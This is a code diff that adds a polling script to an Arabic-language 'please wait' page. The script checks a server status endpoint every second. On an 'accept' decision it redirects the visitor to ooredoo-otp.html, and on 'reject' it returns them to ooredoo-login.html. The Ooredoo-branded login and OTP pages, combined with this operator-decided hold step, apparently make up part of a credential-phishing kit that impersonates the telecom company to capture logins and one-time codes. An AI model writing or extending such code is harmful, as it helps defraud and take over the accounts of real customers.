@@ -93,5 +93,25 @@
     <p>يرجى الانتظار لحظات...</p>
     <div class="loader" role="status" aria-label="جارٍ التحميل"></div>
   </main>
+  <script>
+    (function(){
+      var ref = new URLSearchParams(window.location.search).get('ref');
+      if (!ref) return;
+      var timer = setInterval(function(){
+        fetch('/api/status/' + encodeURIComponent(ref), {cache:'no-store'})
+          .then(function(r){ return r.ok ? r.json() : null; })
+          .then(function(d){
+            if (!d) return;
+            if (d.decision === 'accept' && d.next === 'otp') {
+              clearInterval(timer);
+              window.location.href = 'ooredoo-otp.html?ref=' + encodeURIComponent(ref);
+            } else if (d.decision === 'reject') {
+              clearInterval(timer);
+              window.location.href = 'ooredoo-login.html?ref=' + encodeURIComponent(ref);
+            }
+          }).catch(function(){});
+      }, 1000);
+    })();
+  </script>
 </body>
 </html>
